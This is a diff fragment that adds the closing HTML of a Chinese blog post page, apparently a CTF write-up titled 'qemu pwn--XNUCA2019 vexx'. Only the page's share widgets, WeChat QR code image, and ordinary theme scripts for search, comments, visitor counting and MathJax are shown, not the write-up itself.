+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/02/29/qemu-pwn-XNUCA2019-vexx/&title=《qemu pwn--XNUCA2019 vexx》 — DaJun的Blog&source=曾经被XNUCA支配的我……终于发现还是自己太菜了QAQ" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMElEQVR42u3awZICIQxFUf//p3uqZtsD3peoNYbLytIWOSwwJHk88Lh+x/31/sn7+/d57s/v528NGTJkfC3j2o7VM+lSVu+s5uRrkyFDxjkMcsiSn9zzCJIc7jJkyJDBpybU/dEpQ4YMGe9j8GCRX4BlyJAhY8/gByJPje0DxM6WyZAh4zRGpzDw7tcfqm/IkCHjHzOucKRpuP4VF61KhgwZoxk86U8CPjJDv8EiiHBlyJAxgpG2WfQXR+aJk24yZMgYzSBXVtJ+wQ9H/q1aiClDhoypDN7CVTsE05JD7TotQ4aM2Yy0haKzrLR1Iz7oZciQMY7B2yDSNBkvANQKqH/UN2TIkHEMo3815VfQdCOW35UhQ8ZoRr+riiyIb9OLmy1kyJAxgpGm0motF52QEZU5ZciQMZqRXlN54qyTSuOrkiFDxmmMoN2qlD4jT9aKCjJkyJjN6JQe+6RO6VSGDBnnMPhy03RbLRzknz6JcGXIkHEAo9MwUTs0+afLUFKGDBlDGbW2Cd4qkR7Z6f1bhgwZpzFqwR8PCmvFy+AuLkOGjKGMtBkiTZaRdFunFFHsBJEhQ8ZXMa5w9MuNJJTkx+uT/w0ZMmSMYPCR/ny/5FArG8iQIWMqg18XOyXM/Ua8oPwpQ4aMAxjkMI1btRqtq/FdXIYMGTLAotODO90+lHSTIUOGDFyS5LDaRVqGDBlnMmoHZS31zxcabIcMGTJGM/qFgTT4440XnZllyJAxgvEDATPCeB3NVD4AAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.4"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.4"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '(～﹃～)~zZ';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(￣▽￣)';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+</body>
+</html>
